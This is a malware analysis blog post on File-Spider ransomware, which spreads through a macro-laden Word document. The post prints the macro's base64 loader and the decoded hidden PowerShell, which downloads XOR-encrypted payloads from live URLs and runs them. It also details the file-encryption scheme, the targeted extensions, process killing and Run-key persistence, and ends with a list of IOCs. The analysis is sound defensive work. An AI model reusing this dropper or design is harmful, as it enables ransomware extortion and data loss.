---
title: "Analysis of File-Spider Ransomware"
date: 2017-12-11T23:14:00+05:30
slug: "analysis-of-file-spider-ransomware"
draft: false
tags:
  - "FileSpider"
  - "MS Word"
  - "MSIL"
  - "PowerShell"
  - "Ransomware"
  - "Spider"
cover:
  image: "/images/analysis-of-file-spider-ransomware/ransomidtxt-32cd8163.png"
  alt: "Analysis of File-Spider Ransomware"
  relative: false
canonicalURL: "https://sdkhere.blogspot.com/2017/12/analysis-of-file-spider-ransomware.html"
ShowToc: true
TocOpen: false
---

MD5: de7b31517d5963aefe70860d83ce83b9 [[VirusTotal](https://www.virustotal.com/#/file/1753cfa7bec8b6044b07823deee14d9ca366c54b42c1c9d4ff045dac2fc112d9/detection)]  
FileName: BAYER\_CROPSCIENCE\_OFFICE\_BEOGRAD\_93876.doc  
FileType: MS Word Document  
  
The Word file has an embedded macro.  
When you look into the macro code, you will find the below snippet.  
  

```
Private Function decodeBase64(ByVal strData As String) As Byte()
    Dim objXML As MSXML2.DOMDocument
    Dim objNode As MSXML2.IXMLDOMElement
    
    Set objXML = New MSXML2.DOMDocument
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.Text = strData
    decodeBase64 = objNode.nodeTypedValue
    
    Set objNode = Nothing
    Set objXML = Nothing
End Function

Private Function str() As String

str = "cG93ZXJzaGVsbC5leGUgLXdpbmRvd3N0eWxlIGhpZGRlbiAkZGlyID0gW0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnQXBwbGljYXRpb25EYXRhJykgKyAnXFNwaWRlcic7JGVuYyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjg7ZnVuY3Rpb24geG9yIHtwYXJhbSgkc3RyaW5nLCAkbWV0aG9kK"
str = str + "SR4b3JrZXkgPSAkZW5jLkdldEJ5dGVzKCdBbGJlclRJJyk7JHN0cmluZyA9ICRlbmMuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHN0cmluZykpOyRieXRlU3RyaW5nID0gJGVuYy5HZXRCeXRlcygkc3RyaW5nKTskeG9yZERhdGEgPSAkKGZvciAoJGkgPSAwOyAkaSAtbH"
str = str + "QgJGJ5dGVTdHJpbmcubGVuZ3RoKXtmb3IoJGogPSAwOyAkaiAtbHQgJHhvcmtleS5sZW5ndGg7ICRqKyspeyRieXRlU3RyaW5nWyRpXSAtYnhvciAkeG9ya2V5WyRqXTskaSsrO2lmKCRpIC1nZSAkYnl0ZVN0cmluZy5MZW5ndGgpeyRqID0gJHhvcmtleS5sZW5ndGh9fX0pOyR4b3JkRGF0YSA9ICRlbmMuR2V"
str = str + "0 U3RyaW5nKCR4b3JkRGF0YSk7cmV0dXJuICR4b3JkRGF0YX07ZnVuY3Rpb24gZGF0YSB7cGFyYW0oJG1ldGhvZCkkd2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDsgaWYgKCRtZXRob2QgLWVxICdkJyl7JGlucHV0ID0gJHdlYkNsaWVudC5Eb3dubG9hZFN0cmluZygnaHR0cDov"
str = str + "L3lvdXJqYXZhc2NyaXB0LmNvbS81MTE4NjMxNDc3L2phdmFzY3JpcHQtZGVjLTItMjUtMi5qcycpfWVsc2V7JGlucHV0ID0gJHdlYkNsaWVudC5Eb3dubG9hZFN0cmluZygnaHR0cDovL3lvdXJqYXZhc2NyaXB0LmNvbS81MzEwMzIwMTI3Ny9qYXZhc2NyaXB0LWVuYy0xLTAtOS5qcycpfSRieXRlcyA9IFtDb"
str = str + "252 ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggKHhvciAkaW5wdXQgJ2QnKSApO3JldHVybiAgJGJ5dGVzfTtmdW5jdGlvbiBpbyB7cGFyYW0oJG1ldGhvZClpZigkbWV0aG9kIC1lcSAnZCcpeyRmaWxlbmFtZSA9ICRkaXIgKyAnXGRlYy5leGUnfWVsc2V7JGZpbGVuYW1lID0gJGRpciArICdcZW5jLmV4ZSd9W0"
str = str + "lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRmaWxlbmFtZSwgKGRhdGEgJG1ldGhvZCkpfTtmdW5jdGlvbiBydW4ge3BhcmFtKCRtZXRob2QpaWYgKCRtZXRob2QgLWVxICdkJyl7aW8gJ2QnOyBIC1GaWxlUGF0aCAoJGRpciArICdcZGVjLmV4ZScpIC1Bcmd1bWVudExpc3QgJ3NwaWRlcid"
str = str + "9ZWxzZXtpbyAnZSc7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICgkZGlyICsgJ1xlbmMuZXhlJykgLUFyZ3VtZW50TGlzdCAnc3BpZGVyJywgJ2t0bicsICcxMDAnfX07aWYoIFRlc3QtUGF0aCAkZGlyKXt9ZWxzZXttZCAkZGlyOyBydW4gJ2QnOyBydW4gJ2UnIH0="

str = StrConv(decodeBase64(str), vbUnicode)

End Function
```

  
After Base64 decoding, we will get the following PowerShell script.  
  

```
powershell.exe -windowstyle hidden $dir = [Environment]::GetFolderPath('ApplicationData') + '\Spider';$enc = [System.Text.Encoding]::UTF8;
function xor{
param($string, $method)$xorkey = $enc.GetBytes('AlberTI');
$string = $enc.GetString([System.Convert]::FromBase64String($string));
$byteString = $enc.GetBytes($string);
$xordData = $(for ($i = 0; 
$i -lt $byteString.length){for($j = 0; $j -lt $xorkey.length; 
$j++){$byteString[$i] -bxor $xorkey[$j];
$i++;if($i -ge $byteString.Length){$j = $xorkey.length}}});
$xordData = $enc.GetString($xordData);return $xordData};
function data {
param($method)$webClient = New-Object System.Net.WebClient; 
if ($method -eq 'd'){
$input = $webClient.DownloadString('http://yourjavascript.com/5118631477/javascript-dec-2-25-2.js')}
else{
$input = $webClient.DownloadString('http://yourjavascript.com/53103201277/javascript-enc-1-0-9.js')}
$bytes = [Convert]::FromBase64String( (xor $input 'd') );
return  $bytes};
function io {
param($method)
if($method -eq 'd'){
$filename = $dir + '\dec.exe'}
else{
$filename = $dir + '\enc.exe'}[IO.File]::WriteAllBytes($filename, (data $method))};
function run {
param($method)
if ($method -eq 'd'){io 'd'; 
Start-Process -FilePath ($dir + '\dec.exe') -ArgumentList 'spider'}
else{
io 'e'; Start-Process -FilePath ($dir + '\enc.exe') -ArgumentList 'spider', 'ktn', '100'}};
if( Test-Path $dir){}else{md $dir; run 'd'; run 'e' }
```

  
The PowerShell script first creates a directory %APPDATA%\Spider, downloads the decryptor (dec.exe), and downloads and executes the encryptor (enc.exe).  
  
The encryptor is downloaded from hxxp://yourjavascript.com/53103201277/javascript-enc-1-0-9.js which is base64 encoded and encrypted with XOR; the encryption key for XOR is "AlberTI". So the encryptor is downloaded, decrypted, saved at %APPDATA%\enc.exe and executed with 3 arguments "spider", "ktn", "100".  
  
Similarly the decryptor is downloaded from hxxp://yourjavascript.com/5118631477/javascript-dec-2-25-2.js, which is again base64 encoded and encrypted with XOR; the XOR key is the same. It is decrypted, saved at %APPDATA%\dec.exe and executed with the argument "spider".  

**Encryptor (enc.exe) :**  

MD5 : 67D5ABDA3BE629B820341D1BAAD668E3 [[VirusTotal](https://www.virustotal.com/#/file/6500a1baa13e0698e3ed41b4465e5824e9a316b22209223754f0ab04a6e1b853/detection)]  
FileName: enc.exe  
FileType: MSIL  
  
This binary is executed with 3 arguments "spider", "ktn" and "100".  
First of all it creates a victim's ID and dumps it to %APPDATA%\Spider\id.txt  
[![](/images/analysis-of-file-spider-ransomware/ransomidtxt-32cd8163.png)](/images/analysis-of-file-spider-ransomware/ransomidtxt-32cd8163.png)  
  
One string is created from 0x20 bytes of a random number, the second argument (ktn) and the third argument (100). It is encrypted with the RSA algorithm; the RSA public key is hardcoded in the function, which is-  
  
<RSAKeyValue<Modulus>w7eSLIEBvAgxfDAH/P+ktHJa5Okev4klIRleEhAnR9/1gs5ZHySCUgidDJUVaFrplYLgMUDbsR9aUCBwf07CD8bJL6rUHqeIxpYoF2M7bGW5Vulz3w8C9WMxqnzsqfak9wbt9rT63HoZ5zPHy2ieBfkAEs3XsuaU/q2drl2mQhZodGF+nwiiwfq0gOK+XvPPp9Nq3bCPhVUBzAcp2tXcplT4GjDfSyR8M2VfRzWChipf+plUmcvUafki56ubNW9pApUpd7UOEY1UKqHneMYdVJNhNrsx3T+wJiQNKj2/NMWSfGrN9W+QAVBnqbPgxmSYhfYNy7Fra32yOZ7ho3H1sw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>  
  
Encrypted data is encoded with base64 and saved at %APPDATA%\Spider\id.txt, which is the victim's ID and useful for the decryption process.  
  
The sample traverses each drive and encrypts those files which have the following extensions.  
  

```
lnk url contact 1cd dbf dt cf cfu mxl epf kdbx erf vrp grs geo st conf pff mft efd 3dm 3ds rib ma sldasm sldprt max blend 
lwo lws m3d mb obj x x3d movie byu c4d fbx dgn dwg 4db 4dl 4mp abs accdb accdc accde accdr accdt accdw accft adn a3d adp 
aft ahd alf ask awdb azz bdb bib bnd bok btr bak backup cdb ckp clkw cma crd daconnections dacpac dad dadiagrams daf daschema
db db-shm db-wal db2 db3 dbc dbk dbs dbt dbv dbx dcb dct dcx ddl df1 dmo dnc dp1 dqy dsk dsn dta dtsx dxl eco ecx edb emd eql 
fcd fdb fic fid fil fm5 fmp fmp12 fmpsl fol fp3 fp4 fp5 fp7 fpt fzb fzv gdb gwi hdb his ib idc ihx itdb itw jtx kdb lgc maq mdb 
mdbhtml mdf mdn mdt mrg mud mwb s3m myd ndf ns2 ns3 ns4 nsf nv2 nyf oce odb oqy ora orx owc owg oyx p96 p97 pan pdb pdm phm pnz 
pth pwa qpx qry qvd rctd rdb rpd rsd sbf sdb sdf spq sqb stp sql sqlite sqlite3 sqlitedb str tcx tdt te teacher tmd trm udb usr 
v12 vdb vpd wdb wmdb xdb xld xlgc zdb zdc cdr cdr3 ppt pptx 1st abw act aim ans apt asc ascii ase aty awp awt aww bad bbs bdp bdr 
bean bna boc btd bzabw chart chord cnm crwl cyi dca dgs diz dne doc docm docx docxml docz dot dotm dotx dsv dvi dx eio eit email 
emlx epp err etf etx euc fadein faq fb2 fbl fcf fdf fdr fds fdt fdx fdxt fes fft flr fodt fountain gtp frt fwdn fxc gdoc gio gpn 
gsd gthr gv hbk hht hs htc hwp hz idx iil ipf jarvis jis joe jp1 jrtf kes klg knt kon kwd latex lbt lis lit lnt lp2 lrc lst ltr 
ltx lue luf lwp lxfml lyt lyx man map mbox md5txt me mell min mnt msg mwp nfo njx notes now nwctxt nzb ocr odm odo odt ofl oft 
openbsd ort ott p7s pages pfs pfx pjt plantuml prt psw pu pvj pvm pwi pwr qdl rad readme rft ris rng rpt rst rt rtd rtf rtx run 
rzk rzn saf safetext sam scc scm scriv scrivx sct scw sdm sdoc sdw sgm sig skcard sla slagz sls smf sms ssa strings stw sty sub 
sxg sxw tab tdf tex text thp tlb tm tmv tmx tpc trelby tvj txt u3d u3i unauth unx uof uot upd utf8 unity utxt vct vnt vw wbk wcf 
webdoc wgz wn wp wp4 wp5 wp6 wp7 wpa wpd wpl wps wpt wpw wri wsc wsd wsh wtx xbdoc xbplate xdl xlf xps xwp xy3 xyp xyw ybk yml zabw
zw 2bp 036 3fr 0411 73i 8xi 9png abm afx agif agp aic albm apd apm apng aps apx art artwork arw asw avatar bay blkrt bm2 bmp bmx 
bmz brk brn brt bss bti c4 cal cals can cd5 cdc cdg cimg cin cit colz cpc cpd cpg cps cpx cr2 ct dc2 dcr dds dgt dib dicom djv djvu 
dm3 dmi vue dpx wire drz dt2 dtw dvl ecw eip exr fal fax fpos fpx g3 gcdp gfb gfie ggr gif gih gim gmbck gmspr spr scad gpd gro grob
hdp hdr hpi i3d icn icon icpr iiq info int ipx itc2 iwi j j2c j2k jas jb2 jbig jbig2 jbmp jbr jfif jia jng jp2 jpe jpeg jpg jpg2 
jps jpx jtf jwl jxr kdc kdi kdk kic kpg lbm ljp mac mbm mef mnr mos mpf mpo mrxs myl ncr nct nlm nrw oc3 oc4 oc5 oci omf oplc af2 
af3 ai asy cdmm cdmt cdmtz cdmz cdt cgm cmx cnv csy cv5 cvg cvi cvs cvx cwt cxf dcs ded design dhs dpp drw dxb dxf egc emf ep eps 
epsf fh10 fh11 fh3 fh4 fh5 fh6 fh7 fh8 fif fig fmv ft10 ft11 ft7 ft8 ft9 ftn fxg gdraw gem glox hpg hpgl hpl idea igt igx imd vbox
vdi ink lmk mgcb mgmf mgmt mt9 mgmx mgtx mmat mat otg ovp ovr pcs pfd pfv pl plt pm vrml pmg pobj ps psid rdl scv sk1 sk2 slddrt 
snagitstamps snagstyles ssk stn svf svg svgz sxd tlc tne ufr vbr vec vml vsd vsdm vsdx vstm stm vstx wmf wpg vsm vault xar xmind 
xmmap yal orf ota oti ozb ozj ozt pal pano pap pbm pc1 pc2 pc3 pcd pcx pdd pdn pe4 pef pfi pgf pgm pi1 pi2 pi3 pic pict pix pjpeg 
pjpg png pni pnm pntg pop pp4 pp5 ppm prw psd psdx pse psp pspbrush ptg ptx pvr px pxr pz3 pza pzp pzs z3d qmg ras rcu rgb rgf ric 
riff rix rle rli rpf rri rs rsb rsr rw2 rwl s2mv sai sci sep sfc sfera sfw skm sld sob spa spe sph spj spp sr2 srw ste sumo sva save 
ssfn t2b tb0 tbn tfc tg4 thm thumb tif tiff tjp tm2 tn tpi ufo uga usertile-ms vda vff vpe vst wb1 wbc wbd wbm wbmp wbz wdp webp wpb 
wpe wvl x3f y ysp zif cdr4 cdr6 cdrw pdf pbd pbl ddoc css pptm raw cpt tga xpm ani flc fb3 fli mng smil mobi swf html xls xlsx csv 
xlsm ods xhtm 7z m2 rb rar wmo mcmeta m4a itm vfs0 indd sb mpqge fos p7c wmv mcgame db0 p7b vdf DayZProfile p12 d3dbsp ztmp rofl 
sc2save sis hkx pem dbfv sie sid bar crt sum ncf upk cer wb2 ibank menu das der t13 layout t12 dmp litemod dxg qdf blob asset xf esm 
forge tax 001 r3d pst pkpass vtf bsa bc6 dazip apk bc7 fpk re4 bkp mlx sav raf qic kf lbf bkf iwd slm xlk sidn vpk bik mrwref xlsb 
sidd tor epk mddata psk rgss3a itl rim pak w3x big icxs fsh unity3d hvpl ntl wotreplay crw hplg arch00 xxx hkdb lvl desc mdbackup snx 
py srf odc syncdb cfr m3u gho ff odp cas vpp_pc js dng lrf c cpp cs h bat ps1 php asp java jar class aaf aep aepx plb prel prproj aet 
ppj indl indt indb inx idml pmd xqx fla as3 as docb xlt xlm xltx xltm xla xlam xll xlw pot pps potx potm ppam ppsx ppsm sldx sldm aif 
iff m4u mid mpa ra 3gp 3g2 asf asx vob m3u8 mkv dat efx vcf xml ses zip 7zip mp4 3gp webm wmv
```

  
Directories which are going to be skipped are:  
  
"tmp", "Videos", "winnt", "Application Data", "Spider", "PrefLogs", "Program Files (x86)", "Program Files", "ProgramData", "Temp", "Recycle", "System Volume Information", "Boot", "Windows"  
  
Each file is encrypted by the AES CFB algorithm with the same key, which is encrypted by RSA, and random 0x20 bytes of salt.  
  
[![](/images/analysis-of-file-spider-ransomware/aes_algo-b53bdd53.png)](/images/analysis-of-file-spider-ransomware/aes_algo-b53bdd53.png)  
  
The password and salt are randomly generated.  
These two are different for each file, so they are prepended to the encrypted file.  
The first 0x20 bytes are the salt, the next 0x50 bytes are the AES encrypted password and the rest is the encrypted file data.  
  
[![](/images/analysis-of-file-spider-ransomware/encrypted_file-25150054.png)](/images/analysis-of-file-spider-ransomware/encrypted_file-25150054.png)  
  
After the encryption of each file, it will add the full path of the encrypted file to %APPDATA%\Spider\files.txt  
  
[![](/images/analysis-of-file-spider-ransomware/filetxt-2097aa36.png)](/images/analysis-of-file-spider-ransomware/filetxt-2097aa36.png)  
  
In each directory, it creates an internet shortcut file named "HOW TO DECRYPT FILES.url" which redirects to hxxps://vid.me/embedded/CGyDc?autoplay=1&stats=1. It's a video which shows how to remove the ransomware by paying a ransom in Bitcoin to the attacker.  
  
It appends .spider extension to each encrypted file.  
[![](/images/analysis-of-file-spider-ransomware/enc_files-1be53abb.png)](/images/analysis-of-file-spider-ransomware/enc_files-1be53abb.png)  

**Decryptor (dec.exe) :**  

MD5: fdd465863a4c44aa678554332d20aee3 [[VirusTotal](https://www.virustotal.com/#/file/74e5096f09a031800216640a8455bc487e9a32b2e56fbad9d083c3810ed5488e/detection)]  
FileName: dec.exe  
FileType: MSIL  
  
The dec.exe is executed with a single argument "spider".  
It creates a mutex of name "SpiderForm" to avoid execution of multiple instances.  
The argument provided to this must be "spider" or "startup" for further execution.  
  
[![](/images/analysis-of-file-spider-ransomware/dec_code-ade62766.png)](/images/analysis-of-file-spider-ransomware/dec_code-ade62766.png)  
  
Then it creates a thread which terminates all the following processes.  
"taskmgr", "procexp", "msconfig", "Starter", "regedit", "cdclt", "cmd", "OUTLOOK", "WINWORD", "EXCEL", "MSACCESS"  
  
After that it makes a run entry (SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) for dec.exe to run it on startup.  
Name : "Starter"  
Value : "%APPDATA%\Spider\dec.exe startup"  
  
In the last, it will start the form which contains payment instructions and the decryption tool.  
  
[![](/images/analysis-of-file-spider-ransomware/dec_tool-4054b701.png)](/images/analysis-of-file-spider-ransomware/dec_tool-4054b701.png)  
  
[![](/images/analysis-of-file-spider-ransomware/dec_key-ef40d7a4.png)](/images/analysis-of-file-spider-ransomware/dec_key-ef40d7a4.png)  
  
Payment site of File Spider ransomware is spiderwjzbmsmu7y[.]onion  
  
[![](/images/analysis-of-file-spider-ransomware/onionsite-78a9f0cd.jpg)](/images/analysis-of-file-spider-ransomware/onionsite-78a9f0cd.jpg)  
  

**IOCs :**  

MS word document : de7b31517d5963aefe70860d83ce83b9  
Encrypted enc.exe : hxxp://yourjavascript.com/53103201277/javascript-enc-1-0-9.js  
Encrypted dec.exe : hxxp://yourjavascript.com/5118631477/javascript-dec-2-25-2.js  
enc.exe : 67D5ABDA3BE629B820341D1BAAD668E3  
dec.exe : fdd465863a4c44aa678554332d20aee3  
Payment site : spiderwjzbmsmu7y[.]onion  

Video : hxxps://vid.me/embedded/CGyDc?autoplay=1&stats=1
